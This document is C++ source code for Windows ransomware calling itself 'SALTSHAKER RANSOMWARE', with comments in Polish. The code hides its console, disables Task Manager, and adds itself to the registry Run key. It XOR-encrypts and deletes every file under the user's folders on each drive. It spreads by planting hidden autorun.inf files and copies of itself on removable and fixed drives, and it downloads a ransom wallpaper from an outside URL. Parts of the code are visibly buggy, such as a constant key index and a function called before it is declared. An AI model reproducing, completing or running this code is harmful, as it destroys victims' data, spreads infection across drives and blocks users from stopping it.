#include <iostream>
#include <Windows.h>
#include <fstream>
#include <filesystem>
#include <Windows.h>
#include <string>
#include <filesystem>
#include <sstream>
#pragma comment(lib,"urlmon.lib")
#pragma comment(lib,"Winmm.lib")

std::string randomKey(int n) {
	char alphabet[] = {
		 'a', 'b', 'c', 'd', 'e', 'f', 'g',
						  'h', 'i', 'j', 'k', 'l', 'm', 'n',
						  'o', 'p', 'q', 'r', 's', 't', 'u',
						  'v', 'w', 'x', 'y', 'z','ę','ą','ć','<',',','>' };
	std::string res = "";
	for (int i = 0;i < n;i++)res += alphabet[rand() % 29];
	return res;
}
void Encryption(const char* input, const char* output) {
	std::ifstream input_file(input);
	if (!input_file.good())std::cout << "  input file oppening Error - " << GetLastError();
	std::ofstream output_file(output);
	if (!output_file.good())std::cout << "  output file oppening Error - " << GetLastError();

	char c;
	std::string key = randomKey(MAX_PATH);
	input_file >> std::noskipws;
	while (!input_file.eof() && output_file.good()) {
		if (input_file.peek() == std::ifstream::traits_type::eof()) {
			printf("\nEND of FILE in input Error - %d", GetLastError());
			break;
		}
		input_file >> c;
		output_file << char(c ^ key[144 % (sizeof(key) * MAX_PATH ^ 'v' / sizeof(char) * 20)]);
	}
	input_file.close();
	output_file.close();
	remove(input);
}
void FindFies(const std::string& dirPath) {
	std::string  ListFiles;
	try {
		if (std::filesystem::exists(dirPath) && std::filesystem::is_directory(dirPath)) {
			std::filesystem::recursive_directory_iterator iter(dirPath);
			std::filesystem::recursive_directory_iterator end;
			std::cout << dirPath;
			int i = 0;
			while (iter != end) {
				if (std::filesystem::is_directory(iter->path())) {
					//iter.disable_recursion_pending();
					std::cout << iter->path().string();
				}
				else {
					ListFiles = iter->path().string();
					std::string path = ListFiles + ".SALTSHAKER";

					Encryption(ListFiles.c_str(), path.c_str());
					std::cout << ListFiles << '\n';
				}
				std::error_code ec;
				iter.increment(ec);
				if (ec) {
					std::cerr << "error while accessing: " << iter->path().string() << "::" << ec.message() << '\n';
				}
				i++;
			}
		}
	}
	catch (std::system_error& e) {
		std::cerr << "exception :: " << e.what();
	}
}
LPSTR FindDriveType(LPSTR lpdrv, const char* path)
{
	UINT drvType;
	char szMsg[150];
	std::string path2 = path;
	std::string name = path2 + "autorun.inf\0";
	std::string toFile = "[autorun]\nopen=SALTSHAKER.exe\0";
	HANDLE fHand;
	BOOL bError = FALSE;
	drvType = GetDriveType(lpdrv);
	if (drvType != NULL) {
		switch (drvType)
		{
		case DRIVE_REMOVABLE:
			wsprintf(szMsg, "Drive %s is a removable drive", lpdrv);
			fHand = CreateFileA((LPCSTR)name.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
			if (fHand != INVALID_HANDLE_VALUE) {
				DWORD size = (DWORD)strlen(toFile.c_str());
				DWORD bytesdw = 0;
				bError = WriteFile(fHand, toFile.c_str(), size, &bytesdw, NULL);
				if (bError != FALSE) {
					LPSTR BUFFER[MAX_PATH];
					GetTempPath(MAX_PATH, (LPSTR)BUFFER);
					std::string tempPth = (const char*)BUFFER;
					tempPth += "SALTSHAKER.exe";
					std::string newpath = path;
					newpath += "SALTSHAKER.exe";

					if (CopyFileExA(tempPth.c_str(), newpath.c_str(), NULL, NULL, FALSE, COPY_FILE_RESTARTABLE) == ERROR_SUCCESS || GetLastError() == 0) {
					}
					else printf("copying salthsaker.exe error - %d", GetLastError());
				}
				else printf("writing to error - %d", GetLastError());
			}
			else printf("creating file error - %d", GetLastError());
			break;
		case DRIVE_FIXED:
			wsprintf(szMsg, "Drive %s is a hard disk", lpdrv);
			fHand = CreateFileA((LPCSTR)name.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
			if (fHand != INVALID_HANDLE_VALUE) {
				DWORD size = (DWORD)strlen(toFile.c_str());
				DWORD bytesdw = 0;
				bError = WriteFile(fHand, toFile.c_str(), size, &bytesdw, NULL);
				if (bError != FALSE) {
					LPSTR BUFFER[MAX_PATH];
					GetTempPath(MAX_PATH, (LPSTR)BUFFER);
					std::string tempPth = (const char*)BUFFER;
					tempPth += "SALTSHAKER.exe";
					std::string newpath = path;
					newpath += "SALTSHAKER.exe";

					if (CopyFileExA(tempPth.c_str(), newpath.c_str(), NULL, NULL, FALSE, COPY_FILE_RESTARTABLE) == ERROR_SUCCESS || GetLastError() == 0) {
						SetFileAttributesA(newpath.c_str(), FILE_ATTRIBUTE_HIDDEN);
					}
					else printf("copying salthsaker.exe error - %d", GetLastError());
				}
				else printf("writing to error - %d", GetLastError());
			}
			else printf("creating file error - %d", GetLastError());
			break;
		default: break;
		}
	}
	return szMsg;
}
void GetDirs(int level = 1)
{
	if (level == 1) {
		DWORD dwMask = 1; // LSB is A: flag
		DWORD dwDrives = GetLogicalDrives();
		char strDrive[4] = { '\0' };
		char strDrivex[4] = { '\0' };
		std::string szMsg;
		LPSTR userName[MAX_PATH];
		DWORD size = MAX_PATH;
		GetUserNameA((LPSTR)userName, &size);
		std::string temp = (const char*)userName;
		// 26 letters in [A .. Z]
		for (int i = 0; i < 26; i++)
		{
			// Logically 'AND' the bitmask with 0x1. We get zero if its a valid drive
			if (dwDrives & dwMask)
			{
				wsprintfA((LPSTR)strDrive, "%c:\\", 'A' + i);
				wsprintfA((LPSTR)strDrivex, "%c:", 'A' + i);
				std::string path = strDrive;
				path += "\\Users\\" + temp;
				szMsg = FindDriveType(strDrivex, strDrive);
				FindFies(path);//zabezpieczenie powinno tu byc (strDrive) zamiast recznie wpisanej sciezki

				// Zero filling the buffer to prevent overwrite
				for (int j = 0; j < 4; j++)
				{
					strDrive[j] = '\0';
				}
			}
			dwMask <<= 1;
		}
	}
	else if (level == 2) {
		DWORD dwMask = 1; // LSB is A: flag
		DWORD dwDrives = GetLogicalDrives();
		char strDrive[4] = { '\0' };
		char strDrivex[4] = { '\0' };
		std::string szMsg;

		// 26 letters in [A .. Z]
		for (int i = 0; i < 26; i++)
		{
			// Logically 'AND' the bitmask with 0x1. We get zero if its a valid drive
			if (dwDrives & dwMask)
			{
				wsprintfA((LPSTR)strDrive, "%c:\\", 'A' + i);
				wsprintfA((LPSTR)strDrivex, "%c:", 'A' + i);
				szMsg = FindDr(strDrivex, strDrive);

				// Zero filling the buffer to prevent overwrite
				for (int j = 0; j < 4; j++)
				{
					strDrive[j] = '\0';
				}
			};
			dwMask <<= 1;
		}
	}
}
void disableTaskmgr() {
	HKEY hKey;
	LPCSTR lpValueName = { "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" };
	LONG openReg = RegOpenKeyExA(HKEY_CURRENT_USER, lpValueName, 0, KEY_ALL_ACCESS, &hKey);
	if (openReg != ERROR_SUCCESS)printf("opening key error - ", GetLastError());
	LPCSTR lpSetValue = "DisableTaskmgr";
	DWORD value = 1;
	LONG setReg = RegSetValueExA(hKey, lpSetValue, 0, REG_DWORD, (LPBYTE)&value, sizeof(value));

	if (setReg != ERROR_SUCCESS)printf("set value error - ", GetLastError());
	RegCloseKey(hKey);
}
void TurnOnAutoRun() {
	HKEY hKey;
	LPCSTR lpSubKeyName = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	LONG openReg = RegOpenKeyExA(HKEY_CURRENT_USER, lpSubKeyName, 0, KEY_ALL_ACCESS, &hKey);
	if (openReg != ERROR_SUCCESS)printf("oppening key error - ", GetLastError());
	LPSTR buffer[MAX_PATH];
	GetTempPath(MAX_PATH, (LPSTR)buffer);
	std::string path = (const char*)buffer;
	std::cout << buffer;
	path += "SALTSHAKER.exe";
	if (path.empty())printf("path is empty error - ", GetLastError());
	buffer[MAX_PATH];
	DWORD size = GetModuleFileNameA(NULL, (LPSTR)buffer, MAX_PATH);
	if (!size)printf("copy error - ", GetLastError());
	if (CopyFileExA((LPCSTR)buffer, path.c_str(), NULL, NULL, FALSE, COPY_FILE_RESTARTABLE) == 0)printf(" copy error - ", GetLastError());
	LPCSTR name = "SALTSHAKER RANSOMWARE";
	std::cout << (const BYTE*)path.c_str();
	LONG setReg = RegSetValueExA(hKey, name, 0, REG_SZ, (const BYTE*)path.c_str(), sizeof(path) + 20);

	if (setReg != ERROR_SUCCESS)printf("set value error - ", GetLastError());
	RegCloseKey(hKey);
}
void SetWallpaper(LPCSTR path) {
	if (SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE) == 0) {
		printf(" setting wallpaper error - %d", GetLastError());
	}
}

void Download(LPCSTR url, LPCSTR path) {
	if (URLDownloadToFileA(NULL, url, path, 0, NULL) != S_OK) {
		printf("downloading error - %d", GetLastError());
	}
}
bool exist(std::string& Filename) {
	const std::filesystem::path path = Filename;
	return (std::filesystem::exists(path));
}
LPSTR FindDr(LPSTR lpdrv, const char* path)
{
	UINT drvType;
	char szMsg[150];
	std::string path2 = path;
	std::string name = path2 + "autorun.inf\0";
	std::string toFile = "[autorun]\nopen=SALTSHAKER.exe\0";
	HANDLE fHand;
	BOOL bError = FALSE;
	std::string newpath = path;
	newpath += "SALTSHAKER.exe";
	drvType = GetDriveType(lpdrv);
	if (drvType == NULL)
		return szMsg;
	if (drvType != DRIVE_REMOVABLE)
		return szMsg;
	if (exist(name))return szMsg;
	fHand = CreateFileA((LPCSTR)name.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
	if (fHand == INVALID_HANDLE_VALUE) {
		printf("invalid handle value error - ", GetLastError());
		return szMsg;
	}

	DWORD size = (DWORD)strlen(toFile.c_str());
	DWORD bytesdw = 0;
	bError = WriteFile(fHand, toFile.c_str(), size, &bytesdw, NULL);
	CloseHandle(fHand);
	if (bError == ERROR)printf("writing to error - %d", GetLastError());
	if (exist(newpath))return szMsg;
	LPSTR BUFFER[MAX_PATH];
	GetTempPath(MAX_PATH, (LPSTR)BUFFER);
	std::string tempPth = (const char*)BUFFER;
	tempPth += "SALTSHAKER.exe";
	if (!(CopyFileExA(tempPth.c_str(), newpath.c_str(), NULL, NULL, FALSE, COPY_FILE_RESTARTABLE) == ERROR_SUCCESS || GetLastError() == 0))printf("copying salthsaker.exe error - %d", GetLastError());
	SetFileAttributesA(newpath.c_str(), FILE_ATTRIBUTE_HIDDEN);
	return szMsg;
}

int main()
{
	FreeConsole();//dziala
	disableTaskmgr();//dziala
	TurnOnAutoRun();//dziala
	GetDirs();//dziala
	Download("https://s113.convertio.me/p/K1nZZ5mq4rFmAD7VBMrzGA/dea43d477680b5810c351e186b241c6b/SALTSHAKER.jpeg", "C:\\Windows\\wallpaper.jpeg");//dziala
	SetWallpaper("C:\\Windows\\wallpaper.jpeg");//dziala
	while (true) {
		GetDirs(2);
		Sleep(600);
	}

	return 0;
}